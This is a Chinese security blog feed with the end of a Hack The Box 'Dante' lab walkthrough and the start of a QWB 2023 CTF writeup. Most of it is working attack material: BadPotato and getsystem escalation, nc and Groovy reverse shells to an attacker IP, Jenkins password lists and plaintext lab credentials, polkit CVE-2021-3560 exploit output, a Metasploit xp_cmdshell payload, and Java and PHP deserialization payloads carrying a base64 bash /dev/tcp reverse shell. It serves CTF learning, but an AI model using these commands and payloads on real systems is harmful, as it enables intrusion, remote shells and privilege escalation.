/_/ / /_/ / /_/ / ____/ /_/ / /_/ /_/ / /_/ /_/ / /_____/\__,_/\__,_/_/ \____/\__/\__,_/\__/\____/ Github:https://github.com/BeichenDream/BadPotato/ By:BeichenDream [*] PipeName : \\.\pipe\66836c1007e24080b640ea5c4d421270\pipe\spoolss [*] ConnectPipeName : \\DANTE-WS03/pipe/66836c1007e24080b640ea5c4d421270 [*] CreateNamedPipeW Success! IntPtr:2744 [*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:2124303388560 [*] ConnectNamePipe Success! [*] CurrentUserName : blake [*] CurrentConnectPipeUserName : SYSTEM [*] ImpersonateNamedPipeClient Success! [*] OpenThreadToken Success! IntPtr:1660 [*] DuplicateTokenEx Success! IntPtr:1652 [*] SetThreadToken Success! [*] CurrentThreadUserName : NT AUTHORITY\SYSTEM [*] CreateOutReadPipe Success! out_read:1648 out_write:1640 [*] CreateErrReadPipe Success! err_read:1664 err_write:1672 [*] CreateProcessWithTokenW Success! ProcessPid:5076 nt authority\system [*] Bye! 但不知道什么原因，执行 runme.bat 或者 nc 反弹 shell 时会卡住。 Invoke-BadPotato -Command "c:\temp\nc.exe -e powershell.exe 10.10.14.5 9001" Invoke-BadPotato -Command "c:\temp\runme.bat" 直接使用 msf 内置的 getsystem 获取到 system 权限。 meterpreter &gt; getsystem ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)). Linux: 172.16.1.19 172.16.1.19 80 apache 服务，可显示目录，但没有内容 172.16.1.19 8080 Jekins 服务 172.16.1.19 8443 可能是扫描错误，无法访问 172.16.1.19 8888 可能是扫描错误，无法访问 部分端口无法访问，可能是使用 fscan 扫描出现问题，可以使用 nmap 重新扫一遍。 p -q nmap 172.16.1.102 -sT -Pn -T5 Jekins 后台 getshell goby 扫描 Jenkins 版本为 2.240，存在 WEB-INF/web.xml 读取漏洞，但复现后发现并未存在，应该是误报。 2.240 版本没有公开漏洞，尝试爆破用户名密码。msf 中有集成 jenkins 登陆爆破脚本： auxiliary/scanner/http/jenkins_login 利用脚本的 USERPASS_FILE 可以设置用户名密码文件，用户名和密码之间用空格切分。 asmith Princess1 smoggat Summer2019 tmodle P45678! ccraven Password1 kploty Teacher65 jbercov 4567Holiday1 whaguey acb123 dcamtan WorldOfWarcraft67 tspadly RopeBlackfieldForwardslash ematlis JuneJuly1TY fglacdon FinalFantasy7 tmentrso 65RedBalloons dharding WestminsterOrange5 smillar MarksAndSparks91 bjohnston Bullingdon1 iahmed Sheffield23 plongbottom PowerfixSaturdayClub777 jcarrot Tanenbaum0001 lgesley SuperStrongCantForget123456789 julian manchesterunited ben Welcometomyblog balthazar TheJoker12345! mrb3n S3kur1ty2020! 但此前在 172.16.2.5 (DANTE-DC02) 中获取到了一个 jenkins.bat，其中就包含了一个 jenkins 的凭证，该凭证可以正常登陆到后台。 Admin_129834765/SamsungOctober102030 登陆成功后可以看到一个 Project FLAG_HERE，其中包含了 flag jenkins 中的 script console 可以进一步通过执行 Groovy 获取系统 shell。访问 url：/script String host="10.10.14.5";int port=9898;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); pwncat-cs： listen -m linux 9898 提权至 ian: pspy pspy 可以查看到一些隐藏的进程，其中可能就包含了敏感的凭证信息，这部分功能是 linPEAS 不具备的。 2024/01/01 16:35:01 CMD: UID=0 PID=142235 | /usr/sbin/CRON -f 2024/01/01 16:35:01 CMD: UID=0 PID=142237 | /bin/bash mysql -u ian -p VPN123ZXC 2024/01/01 16:35:01 CMD: UID=0 PID=142236 | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC pspy 找到了一个由 ian 用户运行的 mysql 连接，密码为 VPN123ZXC 提权至 root: polkit:CVE-2021-3560 ▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█ ░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14 https://github.com/liamg/traitor [+] Assessing machine state... [+] Checking for opportunities... [+][polkit:CVE-2021-3560] Polkit version is vulnerable! [+][polkit:CVE-2021-3560] System is vulnerable! Run again with '--exploit polkit:CVE-2021-3560' to exploit it. (remote) jenkins@DANTE-NIX07:/tmp/.j$ ./.t --exploit polkit:CVE-2021-3560 ▀█▀ █▀█ ▄▀█ █ ▀█▀ █▀█ █▀█ ░█░ █▀▄ █▀█ █ ░█░ █▄█ █▀▄ v0.0.14 https://github.com/liamg/traitor [+] Assessing machine state... [+] Checking for opportunities... [+][polkit:CVE-2021-3560] Polkit version is vulnerable! [+][polkit:CVE-2021-3560] Opportunity found, trying to exploit it... [+][polkit:CVE-2021-3560] Sampling timing of user creation command... [+][polkit:CVE-2021-3560] Average time for user creation to fail authentication is 5.879881ms [+][polkit:CVE-2021-3560] Attempting to create user 'traitor795' by forcing UID=0... [+][polkit:CVE-2021-3560] User 'traitor795' was created with UID (1002)! [+][polkit:CVE-2021-3560] Sampling timing of password set command... [+][polkit:CVE-2021-3560] Average time for password set to fail authentication is 5.447048ms [+][polkit:CVE-2021-3560] Attempting to set user password... [+][polkit:CVE-2021-3560] Finished attempting to set password. [+][polkit:CVE-2021-3560] Setting up tty... [+][polkit:CVE-2021-3560] Attempting authentication as new user... [+][polkit:CVE-2021-3560] Authenticated as traitor795 (1002)! [+][polkit:CVE-2021-3560] Attempting escalation to root... [+][polkit:CVE-2021-3560] Authenticated as root! [+][polkit:CVE-2021-3560] Writing payload... root@DANTE-NIX07:~# ls 提权: disk 组用户利用 ian 用户属于 disk 组，”disk”是一个特殊用途的系统组，用于授予用户对磁盘访问的权限。这意味着属于”disk”组的用户可能具有特定的磁盘访问权限，例如对硬盘驱动器进行读写操作。 uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk) 切换到 ian 后查看 /proc/self/mounts 来获取磁盘信息：cat /proc/self/mounts|grep 'sda' cat /proc/self/mounts|grep 'sda' /dev/sda5 / ext4 rw,relatime,errors=remount-ro 0 0 /dev/sda1 /boot/efi vfat rw,relatime,fmask=0077,dmask=0077,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro 0 0 可以看到挂载的 /dev/sda5 就是根目录，并且 ian 用户具备 rw 权限，说明可以通过 debugfs 直接读取任意的文件。 ian@DANTE-NIX07:/tmp$ debugfs /dev/sda5 debugfs 1.45.5 (07-Jan-2020) debugfs: cat /root/flag.txt DANTE{g0tta_&lt;3_ins3cur3_GROupz!} debugfs: Windows: 172.16.1.5 开放端口： 5985,135,445,111,2049,139,1433,47001,21 1433 MSSQL 21 ftp FTP 允许匿名登陆 使用 cme 可以批量扫描内网中的 ftp 是否允许 anonymous 登陆。 p -q crackmapexec ftp 172.16.1.0/24 -u anonymous -p '' 结果如下： FTP 172.16.1.5 21 172.16.1.5 [*] Banner: Dante Staff Drop Box FTP 172.16.1.100 21 172.16.1.100 [*] Banner: (vsFTPd 3.0.3) FTP 172.16.1.101 21 172.16.1.101 [*] Banner:-FileZilla Server 0.9.60 beta 220 DANTE-FTP FTP 172.16.1.12 21 172.16.1.12 [*] Banner: ProFTPD Server (ProFTPD) [::ffff:172.16.1.12] FTP 172.16.1.5 21 172.16.1.5 [+] anonymous: FTP 172.16.1.100 21 172.16.1.100 [+] anonymous: FTP 172.16.1.101 21 172.16.1.101 [-] anonymous: (Response:530 Login or password incorrect!) FTP 172.16.1.12 21 172.16.1.12 [-] anonymous: (Response:530 Login incorrect.) 可以发现 172.16.1.5 也同样允许 ftp 匿名登陆。 登陆后可以得到一个 flag.txt NFS 服务探测 172.16.1.5 的 2049 端口运行了 nfs 服务，nfs 服务与 SMB 有着相同的用途，但没有身份验证和授权机制。 hacktricks 中详细记录了对 nfs 服务的渗透思路：2049 - Pentesting NFS Service - HackTricks 但 nfs 服务上没有挂载任何东西。 p -q showmount -e 172.168.1.5 MSSQL: xp_cmdshell 此前在 172.16.2.6 中获取到一个 SQL 凭证： Sophie/TerrorInflictPurpleDirt996655 msf 中集成了 MSSQL 登陆的脚本： use auxiliary/scanner/mssql/mssql_login set USERNAME Sophie set PASSWORD TerrorInflictPurpleDirt996655 set RHOST 172.16.1.5 run [*] 172.16.1.5:1433 - 172.16.1.5:1433 - MSSQL - Starting authentication scanner. [!] 172.16.1.5:1433 - No active DB -- Credential data will not be saved! [+] 172.16.1.5:1433 - 172.16.1.5:1433 - Login Successful: WORKSTATION\Sophie:TerrorInflictPurpleDirt996655 [*] 172.16.1.5:1433 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 连接 MSSQL 可以使用 impacket 中的 mssqlclient.py p -q mssqlclient.py Sophie:TerrorInflictPurpleDirt996655@172.16.1.5 但会出现报错，应该是本地环境的问题。 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Encryption required, switching to TLS [-] [('SSL routines', '', 'no protocols available')] 切换到 python 3.9 + Impacket v0.11.0 可以正常连接并执行 xp_cmdshell。 [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DANTE-SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'. [*] INFO(DANTE-SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL (sophie dbo@master)&gt; EXEC xp_cmdshell "net user"; MSSQL: xp_cmdshell (MSF) msf 也集成了对 MSSQL xp_cmdshell 的利用，该 exp 会尝试远程下载 payload 再运行。 use exploit/windows/mssql/mssql_payload set LHOST 10.10.14.5 set RHOST 172.16.1.5 set username Sophie set PassWORD TerrorInflictPurpleDirt996655 run [*] Started reverse TCP handler on 10.10.14.5:4444 [*] 172.16.1.5:1433 - Command Stager progress - 1.47% done (1499/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 2.93% done (2998/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 4.40% done (4497/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 5.86% done (5996/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 7.33% done (7495/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 8.80% done (8994/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 10.26% done (10493/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 11.73% done (11992/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 13.19% done (13491/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 14.66% done (14990/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 16.13% done (16489/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 17.59% done (17988/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 19.06% done (19487/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 20.53% done (20986/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 21.99% done (22485/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 23.46% done (23984/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 24.92% done (25483/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 26.39% done (26982/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 27.86% done (28481/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 29.32% done (29980/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 30.79% done (31479/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 32.25% done (32978/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 33.72% done (34477/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 35.19% done (35976/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 36.65% done (37475/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 38.12% done (38974/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 39.58% done (40473/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 41.05% done (41972/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 42.52% done (43471/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 43.98% done (44970/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 45.45% done (46469/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 46.91% done (47968/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 48.38% done (49467/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 49.85% done (50966/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 51.31% done (52465/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 52.78% done (53964/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 54.24% done (55463/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 55.71% done (56962/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 57.18% done (58461/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 58.64% done (59960/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 60.11% done (61459/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 61.58% done (62958/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 63.04% done (64457/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 64.51% done (65956/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 65.97% done (67455/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 67.44% done (68954/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 68.91% done (70453/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 70.37% done (71952/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 71.84% done (73451/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 73.30% done (74950/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 74.77% done (76449/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 76.24% done (77948/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 77.70% done (79447/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 79.17% done (80946/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 80.63% done (82445/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 82.10% done (83944/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 83.57% done (85443/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 85.03% done (86942/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 86.50% done (88441/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 87.96% done (89940/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 89.43% done (91439/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 90.90% done (92938/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 92.36% done (94437/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 93.83% done (95936/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 95.29% done (97435/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 96.76% done (98934/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 98.19% done (100400/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 99.59% done (101827/102246 bytes) [*] 172.16.1.5:1433 - Command Stager progress - 100.00% done (102246/102246 bytes) [*] Sending stage (175686 bytes) to 10.10.110.3 [*] Meterpreter session 16 opened (10.10.14.5:4444 -&gt; 10.10.110.3:19751) at 2024-01-01 22:48:21 -0500 获得 shell 后在 c:\Users 目录中可以发现 flag.txt 提权: PrintSpooler MSSQL 用户一般拥有 SeImpersonatePrivilege 权限，可以使用 Potato 家族提权，MSF 中可以直接使用 getsystem 命令。 meterpreter &gt; getsystem ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)). 参考 Dante by Tamarisk HTB Dante Walkthrough – rainb0w’s blog Wordpress - HackTricks]]></summary></entry><entry><title type="html">QWB 2023 Writeup</title><link href="/ctf/2023/12/19/QWB-2023-writeup.html" rel="alternate" type="text/html" title="QWB 2023 Writeup" /><published>2023-12-19T18:29:48+08:00</published><updated>2023-12-19T18:29:48+08:00</updated><id>/ctf/2023/12/19/QWB-2023-writeup</id><content type="html" xml:base="/ctf/2023/12/19/QWB-2023-writeup.html"><![CDATA[<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231219213702.png" alt="20231219213702" /></p>

<h1 id="web">WEB</h1>
<h2 id="happygame">happygame</h2>
<p>题目提供了一个 gRPC 服务。gRPC 是一个由 Google 初始开发的高性能、开源的远程过程调用（RPC）框架。网上已有不少针对 gRPC 的安全研究：</p>
<ul>
  <li><a href="https://paper.seebug.org/1616/#01">【Black Hat Asia 2021系列分享】自动化挖掘 gRPC 网络接口漏洞</a></li>
  <li><a href="https://xz.aliyun.com/t/11985#toc-2">gRPC内存马研究与查杀 - 先知社区</a></li>
</ul>

<p>gRPC 框架如下所示：
<img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231218193159.png" alt="20231218193159" /></p>

<p>可见服务端由 Java 编写。</p>

<p>针对 gRPC 服务端，我们可以使用 gRPCurl 来逐步枚举服务端提供的接口以及接口定义。下载链接：<a href="https://github.com/fullstorydev/grpcurl">fullstorydev/grpcurl: Like cURL, but for gRPC: Command-line tool for interacting with gRPC servers</a></p>

<p>根据工具文档，我们可以使用 list 来枚举接口，例如：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 list
grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 list helloworld.Greeter
</code></pre></div></div>
<p>使用 describe 来获取接口定义及参数信息:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl <span class="nt">-vv</span> 8.147.133.154:43668 describe helloworld.Greeter.ProcessMsg
</code></pre></div></div>
<p>helloworld.Greeter.ProcessMsg 接口可以接收一个 serializeData，发包格式如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./grpcurl <span class="nt">-plaintext</span> <span class="nt">-d</span> <span class="s1">'{"serializeData":"xxxxx'</span> <span class="nt">-vv</span> 8.147.133.154:43668 helloworld.Greeter/ProcessMsg
</code></pre></div></div>
<p>可以猜测此处存在反序列化漏洞，并且发送数据之后，接口的报错信息会提示我们需要发送 base64 编码数据。</p>

<p>测试 URLDNS 利用链时确认存在漏洞，然后利用 CC6 可以 getshell。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># bash -i &gt;&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1</span>
<span class="c"># bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}</span>

ysoserial CommonsCollections6 <span class="s1">'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHh4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'</span>  | <span class="nb">base64</span> <span class="nt">-w</span> 0
</code></pre></div></div>

<p>poc:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./grpcurl <span class="nt">-plaintext</span> <span class="nt">-d</span> <span class="s1">'{"serializeData":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AGFiYXNoIC1jIHtlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHhNRFF1TWpJMUxqSXpPQzR4TVRBdk9UazVPU0F3UGlZeH18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9dAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="}'</span> <span class="nt">-vv</span> 8.147.133.154:43668 helloworld.Greeter/ProcessMsg
</code></pre></div></div>

<h2 id="thinkshop">thinkshop</h2>
<p>题目给出了一个基于 thinkphp 的 php 服务，模板 goods_edit.html 中存在 unserialize 操作，thinkphp 版本为 5.0.23，可以考虑利用反序列化写入 webshell。</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;textarea</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"data"</span> <span class="na">name=</span><span class="s">"data"</span> <span class="na">rows=</span><span class="s">"3"</span> <span class="na">required</span><span class="nt">&gt;</span>{php}
        
        use app\index\model\Goods;$view=new Goods();echo $view-&gt;arrayToMarkdown(unserialize(base64_decode($goods['data'])));{/php}<span class="nt">&lt;/textarea&gt;</span>
</code></pre></div></div>
<p>编辑商品页面需要登陆 admin 才能访问，数据库中保存的 hash 是 123456 的 md5，但登录部分的代码故意写错，输入 1/123456 才能正常登录。</p>

<p>通过 goods_edit.html 我们可以修改数据库中的 goods 表的 data 字段。但 saveGoods 函数会先将我们的输入进行序列化，然后再保存，最终写入的 payload 都会变成字符串，无法正常触发 thinkphp 利用链。</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">saveGoods</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$data</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">markdownToArray</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">'data'</span><span class="p">])));</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>但 updatedata 函数存在 sql 注入，可以利用 SQL 注入将 payload 插入到 data 字段。</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">updatedata</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$table</span><span class="p">,</span> <span class="nv">$id</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'Error'</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"UPDATE </span><span class="nv">$table</span><span class="s2"> SET "</span><span class="p">;</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$sql</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"`</span><span class="nv">$key</span><span class="s2">` = unhex('"</span> <span class="mf">.</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"'), "</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="nv">$sql</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="s1">', '</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">" WHERE `id` = "</span> <span class="mf">.</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
            <span class="k">return</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">connect</span><span class="p">(),</span> <span class="nv">$sql</span><span class="p">);</span>


        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>此外，题目在反序列化前还有一个校验操作：从数据库取出 data 时会判断是否以 YTo 开头：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">public</span> <span class="k">function</span> <span class="n">getGoodsById</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$select</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Select</span><span class="p">();</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$select</span><span class="o">-&gt;</span><span class="nf">select</span><span class="p">(</span><span class="s1">'goods'</span><span class="p">,</span> <span class="s1">'id'</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'data'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'data'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">"YTo"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">error</span><span class="p">(</span><span class="s2">"数据错误"</span> <span class="p">,</span> <span class="s1">'index/admin/goods_edit'</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>其实是要求反序列化出来一个数组，可以修改一下 phpggc，包一层数组后再生成 payload：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phpggc ThinkPHP/FW1 /var/www/html/ /mnt/share/project/CTF/QWB/thinkshop/shell.php <span class="nt">-b</span> <span class="nt">-u</span>
</code></pre></div></div>
<p>发送 payload：</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/public/index.php/index/admin/do_edit.html</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">eci-2zeiwefvnk7dn1jomqhm.cloudeci1.ichunqiu.com</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1629</span>
